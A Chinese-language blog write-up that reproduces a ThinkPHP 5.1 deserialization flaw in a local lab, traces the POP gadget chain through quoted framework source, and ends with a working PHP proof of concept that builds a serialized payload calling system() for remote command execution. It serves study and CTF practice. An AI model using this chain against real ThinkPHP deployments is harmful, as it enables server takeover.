---
title: ThinkPhp5.1 反序列化漏洞复现
description: 起因是在做CTFshow web入门的反序列化题目时碰到了框架的反序列化，就尝试着复现了一下
date: 2026-06-15 15:37:15
updated: 2026-06-15 15:37:15
image: /cover.jpg
categories: [漏洞复现]
---

## 1.环境搭建

使用composer创建项目，然后启动，访问即可。

```shell
composer create-project topthink/think=5.1.* tp
cd tp
php think run --port=9000
```

访问 `http://127.0.0.1:9000`。

##  2.添加入口

在 `public/index.php` 中添加以下两行，用于接收序列化payload并触发反序列化：

```php
$aa = base64_decode($_POST['aa']);
unserialize($aa);
```

##  3.POP链

起点是 `__destruct` 魔术方法，位于 `thinkphp/library/think/process/pipes/Windows.php`：

```php
public function __destruct()
{
    $this->close();
    $this->removeFiles();
}
```

跟进 `removeFiles()` 方法，其中 `file_exists()` 会判断文件或目录是否存在，存在则用 `unlink()` 删除。`$filename` 可控，如果将其赋值为一个对象，`file_exists()` 执行时会触发该对象的 `__toString()` 魔术方法：

```php
private function removeFiles()
{
    foreach ($this->files as $filename) {
        if (file_exists($filename)) {
            @unlink($filename);
        }
    }
    $this->files = [];
}
```

接着寻找可利用的 `__toString()`。在 `thinkphp/library/think/model/concern/Conversion.php` 中找到：

```php
public function __toString()
{
    return $this->toJson();
}
```

跟进 `toJson()`：

```php
public function toJson($options = JSON_UNESCAPED_UNICODE)
{
    return json_encode($this->toArray(), $options);
}
```

跟进 `toArray()`，关键逻辑在追加属性的部分。`$this->append` 可控，因此 `$key` 和 `$name` 也可控。如果 `$relation` 也可控，就可以通过调用对象不可访问的方法触发 `__call()`：

```php
public function toArray()
{
    $item       = [];
    $hasVisible = false;
    // ...
    // 追加属性（必须定义获取器）
    if (!empty($this->append)) {
        foreach ($this->append as $key => $name) {
            if (is_array($name)) {
                // 追加关联对象属性
                $relation = $this->getRelation($key);

                if (!$relation) {
                    $relation = $this->getAttr($key);
                    if ($relation) {
                        $relation->visible($name);
                    }
                }
            }
        }
    }
}
```

跟进 `getRelation()`，由于后面是 `if (!$relation)`，可以让 `getRelation()` 返回 `null` 来绕过：

```php
public function getRelation($name = null)
{
    if (is_null($name)) {
        return $this->relation;
    } elseif (array_key_exists($name, $this->relation)) {
        return $this->relation[$name];
    }
    return;
}
```

绕过 `getRelation()` 后进入 `getAttr()`：

```php
public function getAttr($name, &$item = null)
{
    try {
        $notFound = false;
        $value    = $this->getData($name);
    } catch (InvalidArgumentException $e) {
        $notFound = true;
        $value    = null;
    }
}
```

跟进 `getData()`：

```php
public function getData($name = null)
{
    if (is_null($name)) {
        return $this->data;
    } elseif (array_key_exists($name, $this->data)) {
        return $this->data[$name];
    } elseif (array_key_exists($name, $this->relation)) {
        return $this->relation[$name];
    }
    throw new InvalidArgumentException('property not exists:' . static::class . '->' . $name);
}
```

分析参数传递：`toArray()` 将 `$key` 传给 `getAttr()`，再传给 `getData()`。由于前面绕过了 `getRelation()`，`$this->relation` 为空，所以走第一个 `elseif`，返回 `$this->data[$name]`。`$this->data` 可控，因此 `$relation` 可控。

需要注意的是，`__toString()` 在 `Conversion` 类中，`getAttr()` 在 `Attribute` 类中，需要找一个同时继承这两个类的。`Attribute` 使用的是 `Trait` 而非 `class`（自 PHP 5.4.0 起，Trait 是一种代码复用方法，通过 `use` 关键字在类中声明组合）。最终找到 `Model` 类，但它是一个抽象类，所以使用其子类 `Pivot`。

下一步寻找 `__call()` 方法。在 `Request` 类中找到：

```php
public function __call($method, $args)
{
    if (array_key_exists($method, $this->hook)) {
        array_unshift($args, $this);
        return call_user_func_array($this->hook[$method], $args);
    }

    throw new Exception('method not exists:' . static::class . '->' . $method);
}
```

这里 `$method` 是 `visible`，`$args` 是之前的 `$name`（可控）。但 `array_unshift($args, $this)` 将 `$this` 插入到 `$args` 最前面，导致 `system` 的第一个参数不可控，无法直接执行命令。

在 ThinkPHP 的 `Request` 类中还有一个 `filter` 功能，事实上 ThinkPHP 多个 RCE 漏洞都与此功能有关。可以通过覆盖 `filter` 的方法来执行代码。找到 `filterValue()`：

```php
private function filterValue(&$value, $key, $filters)
{
    $default = array_pop($filters);
    foreach ($filters as $filter) {
        if (is_callable($filter)) {
            // 调用函数或者方法过滤
            $value = call_user_func($filter, $value);
        } elseif (is_scalar($value)) {
            if (false !== strpos($filter, '/')) {
                // 正则过滤
                if (!preg_match($filter, $value)) {
                    // 匹配不成功返回默认值
                    $value = $default;
                    break;
                }
            } elseif (!empty($filter)) {
                // filter函数不存在时, 则使用filter_var进行过滤
                // filter为非整形值时, 调用filter_id取得过滤id
                $value = filter_var($value, is_int($filter) ? $filter : filter_id($filter));
                if (false === $value) {
                    $value = $default;
                    break;
                }
            }
        }
    }
    return $value;
}
```

`$value` 不可控，需要找一个方法来控制它，这里使用 `input()` 方法：

```php
public function input($data = [], $name = '', $default = null, $filter = '')
{
    if (false === $name) {
        // 获取原始数据
        return $data;
    }

    $name = (string) $name;
    if ('' != $name) {
        // 解析name
        if (strpos($name, '/')) {
            list($name, $type) = explode('/', $name);
        }

        $data = $this->getData($data, $name);

        if (is_null($data)) {
            return $default;
        }

        if (is_object($data)) {
            return $data;
        }
    }

    // 解析过滤器
    $filter = $this->getFilter($filter, $default);

    if (is_array($data)) {
        array_walk_recursive($data, [$this, 'filterValue'], $filter);
        if (version_compare(PHP_VERSION, '7.1.0', '<')) {
            // 恢复PHP版本低于 7.1 时 array_walk_recursive 中消耗的内部指针
            $this->arrayReset($data);
        }
    } else {
        $this->filterValue($data, $name, $filter);
    }

    if (isset($type) && $data !== $default) {
        // 强制类型转换
        $this->typeCast($data, $type);
    }

    return $data;
}
```

可以看到通过 `getFilter()` 获取 `$filter`，再用 `array_walk_recursive()` 回调 `filterValue()`。跟进 `getFilter()`：

```php
protected function getFilter($filter, $default)
{
    if (is_null($filter)) {
        $filter = [];
    } else {
        $filter = $filter ?: $this->filter;
        if (is_string($filter) && false === strpos($filter, '/')) {
            $filter = explode(',', $filter);
        } else {
            $filter = (array) $filter;
        }
    }

    $filter[] = $default;

    return $filter;
}
```

`$filter` 可控。接着需要让 `$data` 可控且 `$name` 为空以绕过 `input()` 前面的判断。这里用 `param()` 方法：

```php
public function param($name = '', $default = null, $filter = '')
{
    if (!$this->mergeParam) {
        $method = $this->method(true);

        // 自动获取请求变量
        switch ($method) {
            case 'POST':
                $vars = $this->post(false);
                break;
            case 'PUT':
            case 'DELETE':
            case 'PATCH':
                $vars = $this->put(false);
                break;
            default:
                $vars = [];
        }

        // 当前请求参数和URL地址中的参数合并
        $this->param = array_merge($this->param, $this->get(false), $vars, $this->route(false));

        $this->mergeParam = true;
    }

    if (true === $name) {
        // 获取包含文件上传信息的数组
        $file = $this->file();
        $data = is_array($file) ? array_merge($this->param, $file) : $this->param;

        return $this->input($data, '', $default, $filter);
    }

    return $this->input($this->param, $name, $default, $filter);
}
```

最后一行调用 `input()`，`$this->param` 由本来的请求参数和 URL 地址中的参数合并而成，可通过 GET 方式控制。接着寻找调用 `param()` 的方法，找到 `isAjax()`：

```php
public function isAjax($ajax = false)
{
    $value  = $this->server('HTTP_X_REQUESTED_WITH');
    $result = 'xmlhttprequest' == strtolower($value) ? true : false;

    if (true === $ajax) {
        return $result;
    }

    $result = $this->param($this->config['var_ajax']) ? true : $result;
    $this->mergeParam = false;
    return $result;
}
```

`$this->config['var_ajax']` 是配置文件中的值，只需要让它为空，那么调用 `$this->param` 时第一个参数 `$name` 就为空，传入 `input()` 的 `$name` 也为空，从而绕过 `input()` 中的 `if` 判断。

**完整链子总结：**

`__destruct()` → `removeFiles()` → `file_exists()` 触发 `__toString()` → `toJson()` → `toArray()` → `getAttr()` → `getData()` → 调用不可访问方法 `visible()` 触发 `__call()` → `call_user_func_array([$this->hook[$method]], $args)` 调用 `isAjax()` → `param()` → `input()` → `array_walk_recursive()` 回调 `filterValue()` → `call_user_func($filter, $value)` 执行命令。

## 4.POC



```php
<?php
namespace think\process\pipes;
use think\model\concern\Conversion;
use think\model\Pivot;

class Pipes
{
}

class Windows extends Pipes
{
    private $files = [];

    public function __construct()
    {
        $this->files = new Pivot();
    }
}

namespace think;

abstract class Model
{
    protected $append = [];
    private $data = [];

    function __construct()
    {
        $this->append = ["Sentiment" => ["hello"]];
        $this->data = ["Sentiment" => new Request()];
    }
}

class Request
{
    protected $hook = [];
    protected $filter = "system";
    protected $config = [
        // 表单请求类型伪装变量
        'var_method'       => '_method',
        // 表单ajax伪装变量
        'var_ajax'         => '_ajax',
        // 表单pjax伪装变量
        'var_pjax'         => '_pjax',
        // PATHINFO变量名 用于兼容模式
        'var_pathinfo'     => 's',
        // 兼容PATH_INFO获取
        'pathinfo_fetch'   => ['ORIG_PATH_INFO', 'REDIRECT_PATH_INFO', 'REDIRECT_URL'],
        // 默认全局过滤方法 用逗号分隔多个
        'default_filter'   => '',
        // 域名根，如thinkphp.cn
        'url_domain_root'  => '',
        // HTTPS代理标识
        'https_agent_name' => '',
        // IP代理获取标识
        'http_agent_ip'    => 'HTTP_X_REAL_IP',
        // URL伪静态后缀
        'url_html_suffix'  => 'html',
    ];

    function __construct()
    {
        $this->filter = "system";
        $this->config = ["var_ajax" => ''];
        $this->hook = ["visible" => [$this, "isAjax"]];
    }
}

namespace think\model;

use think\Model;

class Pivot extends Model
{
}

use think\process\pipes\Windows;

echo base64_encode(serialize(new Windows()));
```

使用方式：GET 传入命令，POST 传入 `aa` 参数（base64编码后的序列化对象）即可。